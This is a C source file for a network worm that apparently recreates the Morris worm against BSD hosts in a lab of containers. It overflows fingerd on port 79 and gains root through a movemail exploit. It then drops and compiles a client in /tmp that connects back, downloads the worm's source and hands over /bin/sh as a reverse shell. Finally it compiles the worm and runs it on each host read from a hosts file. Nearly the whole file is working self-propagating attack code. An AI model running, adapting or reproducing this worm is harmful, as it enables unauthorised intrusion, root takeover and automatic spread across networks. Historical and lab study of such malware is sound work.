#include "worm_bsd_v2.h"
#include <signal.h>

int server_pid;
int *vector_pid;

int num_hosts;
int num_docker_ip;
struct host_info *docker_ip;

int num_filters = 2;
static char *hostname_filters[2] = {"localhost", "simh"};

#define handle_error(msg) \
	do { perror(msg); exit(1); } while (0)
#define MAX(a, b) ((a > b) ? (a) : (b))

#define FINGERD_PORT 79
#define VECTOR_PROGRAM "#include <stdio.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <sys/time.h>\n#include <arpa/inet.h>\n\n#define SERVER_PORT 4444\n#define IO_BUF_SIZE 2048\n\nint send_int(num, fd)\n\tint num;\n\tint fd;\n{\n\tunsigned long conv = htonl((unsigned long)num);\n\tchar *data = (char*)&conv;\n\tint left = sizeof(conv);\n\tint rc;\n\tdo {\n\t\trc = write(fd, data, left);\n\t\tif (rc < 0) {\n\t\t\treturn -1;\n\t\t}\n\t\telse {\n\t\t\tdata += rc;\n\t\t\tleft -= rc;\n\t\t}\n\t}\n\twhile (left > 0);\n\treturn 0;\n}\n\nint receive_int(num, fd)\n\tint *num;\n\tint fd;\n{\n\tunsigned long ret;\n\tchar *data = (char*)&ret;\n\tint left = sizeof(ret);\n\tint rc;\n\tdo {\n\t\trc = read(fd, data, left);\n\t\tif (rc <= 0) { /* instead of ret */\n\t\t\treturn -1;\n\t\t}\n\t\telse {\n\t\t\tdata += rc;\n\t\t\tleft -= rc;\n\t\t}\n\t}\n\twhile (left > 0);\n\t*num = ntohl(ret);\n\treturn 0;\n}\n\nint main(argc, argv)\n\tint argc;\n\tchar *argv[];\n{\n\tint i, j, n, ss, fz, len, fn;\n\tstruct timeval tv;\n\tstruct sockaddr_in saddr;\n\tchar io_buf[IO_BUF_SIZE];\n\tfd_set read_fds;\n\tFILE *outfile;\n\tchar *file_name;\n\tchar *msg = \"Files recieved\\n\";\n\tchar *hello = \"Hello from client!\\n\";\n\n\tif (argc < 2) {\n\t\treturn 1;\n\t}\t\n\n\tss = socket(AF_INET, SOCK_STREAM, 0);\n\tif (ss < 0) {\n\t\treturn 1;\n\t}\n\n\tbzero((char *)&saddr, sizeof(saddr));\n\tsaddr.sin_family = AF_INET;\n\tsaddr.sin_port = htons(SERVER_PORT);\n\tsaddr.sin_addr.s_addr = inet_addr(argv[1]);\n\t\n\twhile (connect(ss, (struct sockaddr *)&saddr, sizeof(saddr)) < 0) {\n\t\tsleep(1);\n\t}\t\n\n\twhile (1) {\n\t\twrite(ss, hello, strlen(hello));\n\t\tFD_ZERO(&read_fds);\n\t\tFD_SET(ss, &read_fds);\n\t\ttv.tv_sec = 5;\n\t\ttv.tv_usec = 0;\n\t\tif (select(ss + 1, &read_fds, (fd_set *)0, (fd_set *)0, &tv) > 0) {\n\t\t\tif (receive_int(&fn, ss) < 0) continue;\t\n\t\t\tif (send_int(fn, ss) < 0) continue;\n\t\t\tfor (i = 0; i < fn; i++) {\n\t\t\t\tif (receive_int(&len, ss) < 0) continue;\t\n\t\t\t\tfile_name = (char *)malloc((len + 1) * sizeof(char));\n\t\t\t\tn = read(ss, file_name, len);\n\t\t\t\tfile_name[n] = '\\0';\n\t\t\t\tif (n <= 0) break;\n\t\t\t\toutfile = fopen(file_name, \"w\");\n\t\t\t\tif (outfile == NULL) break;\n\t\t\t\tif (receive_int(&fz, ss) < 0) continue;\t\n\t\t\t\twhile (fz > 0) {\n\t\t\t\t\tn = read(ss, io_buf, IO_BUF_SIZE -1);\n\t\t\t\t\tif (n > 0) {\n\t\t\t\t\t\tio_buf[n] = '\\0';\n\t\t\t\t\t\tfputs(io_buf, outfile);\n\t\t\t\t\t}\n\t\t\t\t\tfz -= n;\n\t\t\t\t}\t\n\t\t\t\tfclose(outfile);\n\t\t\t\tfree(file_name);\n\t\t\t\tsend_int(i, ss);\n\t\t\t}\t\n\t\t\twrite(ss, msg, strlen(msg));\n\t\t\tbreak;\n\t\t}\t\n\t}\n\tdup2(ss,1);\n\tdup2(ss,0);\n\texecl(\"/bin/sh\", \"/tmp/sh\", 0);\n\treturn 0;\n}\n"

#define NUM_FILES 2
#define FILE_BUF_SIZE 256

#define NUM_FILE_CLIENTS 10
#define FILE_SERVER_PORT 4444
#define LOG_SERVER_IP "172.20.0.1"
#define LOG_SERVER_PORT 5555

handle_connection_event(
	 server_type,
	 fd,
	 sock_addr, 
	 sock_addrlen, 	
	 client_sock, 
	 num_clients
)
	char *server_type;
	int fd;
	struct sockaddr *sock_addr;
	int *sock_addrlen; 
	int *client_sock;
	int num_clients;
 {
	int i;
	int accept_code = accept(fd, sock_addr, sock_addrlen);
	if (accept_code < 0) return;

	for (i = 0; i < num_clients; i++) {
		if (client_sock[i] == -1) { 
			flushed_printf("%s | ", docker_ip[0].ip);
			flushed_printf("New %s client connection received! FD: %d\n", server_type, accept_code);
			client_sock[i] = accept_code;
			return;
		}	
	}	
	flushed_printf("%s | ", docker_ip[0].ip);
	flushed_printf("%s client capacity reached!\n", server_type);
}	

int handle_client_read_event(
	server_type,
	sd, 	
	io_buf,
	io_buf_size
)
	char *server_type;
	int sd;
	char *io_buf;
	int io_buf_size;
 {
	int n = read(sd, io_buf, io_buf_size - 1);

	if (n == 0) {
		flushed_printf("%s | ", docker_ip[0].ip);
		flushed_printf("%s client disconnected\n", server_type);
		return -1;
	} else {	
		io_buf[n] = '\0';
		return 1;
	}	
	 
}	

int phase2_attack(sd, io_buf) 
	int sd; 
	char *io_buf; 
{
	char *success = "Files recieved";

	if (strncmp(success, io_buf, strlen(success)) == 0) { 
		flushed_printf("%s | ", docker_ip[0].ip);
		flushed_printf("Files sent, expecting shell\n");

		write_to_sock(sd, "ls send_file_over_socket_bsd.c\n");
		flushed_printf("%s | ", docker_ip[0].ip);
		read_from_sock(sd, io_buf, (size_t)IO_BUF_SIZE);
		write_to_sock(sd, "ls worm_bsd_v2.h\n");
		flushed_printf("%s | ", docker_ip[0].ip);
		read_from_sock(sd, io_buf, (size_t)IO_BUF_SIZE);
		write_to_sock(sd, "cc worm_bsd_v2.c -o worm; echo DONE\n");
		flushed_printf("%s | ", docker_ip[0].ip);
		read_from_sock(sd, io_buf, (size_t)IO_BUF_SIZE);
		write_to_sock(sd, "./worm \n");
		return 1;
	}	

	return 0;
}	

server() {
	char io_buf[IO_BUF_SIZE];	
	int i;

	static char *file_paths[NUM_FILES] = { "worm_bsd_v2.h", "worm_bsd_v2.c" };
	struct file_object files[NUM_FILES];	
	char file_buf[FILE_BUF_SIZE];

	fd_set read_fd; 	
    int file_server_fd, log_server_fd, max_fd, accept_code, sd;

    struct sockaddr_in file_serv_addr;
    int file_serv_addrlen = sizeof(file_serv_addr);
	int file_client_sock[NUM_FILE_CLIENTS];

	/* load files */
	if (load_files(file_paths, NUM_FILES, files) < 0) 
		handle_error("failed to load files\n");

	for (i = 0; i < NUM_FILES; i++) {
		flushed_printf("%s | ", docker_ip[0].ip);
		flushed_printf("file_name: %s file_size: %d\n", files[i].file_name, files[i].file_size);
	}	

	/* start file server */
	file_server_fd = socket(AF_INET, SOCK_STREAM, 0);
	file_serv_addr.sin_family = AF_INET;
	file_serv_addr.sin_addr.s_addr = INADDR_ANY; 
	file_serv_addr.sin_port = htons(FILE_SERVER_PORT);       
	bind(file_server_fd, (struct sockaddr *)&file_serv_addr, sizeof(file_serv_addr));
	listen(file_server_fd, NUM_FILE_CLIENTS + 1);

	for (i = 0; i < NUM_FILE_CLIENTS; i++) {
		file_client_sock[i] = -1;
	}

	/* main event loop */
	while (1) {
		FD_ZERO(&read_fd);
		FD_SET(file_server_fd, &read_fd);

		max_fd = file_server_fd; 

		for (i = 0; i < NUM_FILE_CLIENTS; i++) {
			if (file_client_sock[i] > 0) {
				FD_SET(file_client_sock[i], &read_fd);	
				max_fd = MAX(file_client_sock[i], max_fd);
			}	
		}	

		if (select(max_fd + 1, &read_fd, NULL, NULL, NULL) < 0) continue;

		/* checking for incoming client connections */
		if (FD_ISSET(file_server_fd, &read_fd)) {
			handle_connection_event(
				"file", 
				file_server_fd, (struct sockaddr *)&file_serv_addr, &file_serv_addrlen,
				file_client_sock, NUM_FILE_CLIENTS
			);
		}	

		/* actually handling clients */
		for (i = 0; i < NUM_FILE_CLIENTS; i++) {
			sd = file_client_sock[i];
			if (sd > 0 && FD_ISSET(sd, &read_fd)) {
				if (handle_client_read_event("file", sd, io_buf, IO_BUF_SIZE) < 0) {
					close(sd);
					file_client_sock[i] = -1;
				} else {
					flushed_printf("%s | ", docker_ip[0].ip);
					flushed_printf("Recieved from file client %d: %s", sd, io_buf);

					if (phase2_attack(sd, io_buf)) {
						close(sd);
						file_client_sock[i] = -1;
					}	
					 
					if (file_client_sock[i] != -1) {
						if (send_files(sd, files, NUM_FILES, file_buf, FILE_BUF_SIZE) < 0)
							flushed_printf("%s | ", docker_ip[0].ip);
							flushed_printf("Failed to send all files\n");
					}	
				}	
			}	
		}	
	} /* end of while loop */
}	

phase1_attack(fd, target_ip)
	int fd;
	char *target_ip;	
{
	char io_buf[IO_BUF_SIZE];
    char buf[BUF_SIZE];

	create_exploit(buf, PAYLOAD, BUF_SIZE, PAYLOAD_LEN);
	write(fd, buf, (size_t)sizeof(buf));
		
	/* confirm that you get a shell */
	write_to_sock(fd, "echo bang\n");
	write_to_sock(fd, "PATH=/bin:/usr/bin:/usr/ucb:/etc; export PATH\n");
	write_to_sock(fd, "whoami\n");
	flushed_printf("%s -> ", docker_ip[0].ip);
	flushed_printf("%s: ", target_ip);
	read_from_sock(fd, io_buf, (size_t)IO_BUF_SIZE);

	/* get root shell */
	get_root_shell_via_movemail_exploit(fd, io_buf, (size_t)IO_BUF_SIZE);

	/* check that you have root shell */
	write_to_sock(fd, "PATH=/bin:/usr/bin:/usr/ucb:/etc; export PATH\n");
	write_to_sock(fd, "whoami\n");
	flushed_printf("%s -> ", docker_ip[0].ip);
	flushed_printf("%s: ", target_ip);
	read_from_sock(fd, io_buf, (size_t)IO_BUF_SIZE);

	/* send over vector file */
	write_to_sock(fd, "cd /tmp\n");
	write_to_sock(fd, "cat << EOF >> client.c\n");
	write_to_sock(fd, VECTOR_PROGRAM);
	write_to_sock(fd, "EOF\n");
	
	/* compile the client and run it */
	write_to_sock(fd, "cc client.c -o client; echo COMPILED MALWARE\n");
	flushed_printf("%s -> ", docker_ip[0].ip);
	flushed_printf("%s: ", target_ip);
	read_from_sock(fd, io_buf, (size_t)IO_BUF_SIZE);
	/* fix the ip */
	sprintf(io_buf, "./client %s\n", docker_ip[0].ip);
	write_to_sock(fd, io_buf);
}	

void client(target_ip) 
	char *target_ip;
{
    int fingerd_client;
    struct sockaddr_in fingerd_serv_addr;

	fingerd_client = socket(AF_INET, SOCK_STREAM, 0);
	create_sockaddr(&fingerd_serv_addr, target_ip, FINGERD_PORT);

	if (connect(fingerd_client, (struct sockaddr *)&fingerd_serv_addr, sizeof(fingerd_serv_addr)) < 0) {
		handle_error("connect");
	}
	phase1_attack(fingerd_client, target_ip);
	close(fingerd_client);
	exit(1);
}	

void sig_handler(signo)
	int signo; 
{
	int i;
	if (signo == SIGINT) {
		if (server_pid > 0) {		
			kill(server_pid, SIGQUIT);
			for (i = 0; i < num_hosts; i++) {
				kill(vector_pid[i], SIGQUIT);
			}	
			free(vector_pid);
		}
	} 
}

int main(argc, argv)
	int argc; 
	char* argv[];
{
	int i,log_client, wstatus;
	struct sockaddr_in log_serv_addr; 
	struct host_info *hosts;

    log_client = socket(AF_INET, SOCK_STREAM, 0);
	if (log_client < 0) { return 1; }

	bzero((char *)&log_serv_addr, sizeof(log_serv_addr));
	create_sockaddr(&log_serv_addr, LOG_SERVER_IP, LOG_SERVER_PORT);

	flushed_printf("connecting to log server at %s %d\n", LOG_SERVER_IP, LOG_SERVER_PORT);
	while (connect(log_client, (struct sockaddr *)&log_serv_addr, sizeof(log_serv_addr)) < 0) { }
	dup2(log_client, 1);
	dup2(log_client, 2);

	num_docker_ip = parse_host(DOCKER_IP, &docker_ip, hostname_filters, num_filters);

	if (num_docker_ip != 1) {
		handle_error("Failed to get docker host info");
	} else {	
		flushed_printf("host info: %s %s\n", docker_ip[0].hostname, docker_ip[0].ip);
	}	

    server_pid = fork();

    if (server_pid == -1) {
        perror("fork failed");
    } else if (server_pid == 0) {
		server();
    } else {
        /* Code executed by the parent process */
		signal(SIGINT, sig_handler);
			
		num_hosts = parse_host(HOSTS_FILE, &hosts, hostname_filters, num_filters);

		if (num_hosts > 0) {
			vector_pid = (int *) malloc(sizeof(int) * num_hosts);
			for (i = 0; i < num_hosts; i++) {
				vector_pid[i] = fork();
				if (vector_pid[i] == 0) {
					flushed_printf("%s | ", docker_ip[0].ip);
					flushed_printf("Attacking %s %s\n", hosts[i].hostname, hosts[i].ip);
					client(hosts[i].ip);
				}	
			}	
		}

		wait(&wstatus);
		free_hosts(hosts, num_hosts);
    }
	free_hosts(docker_ip, num_docker_ip);

    return 0;
}
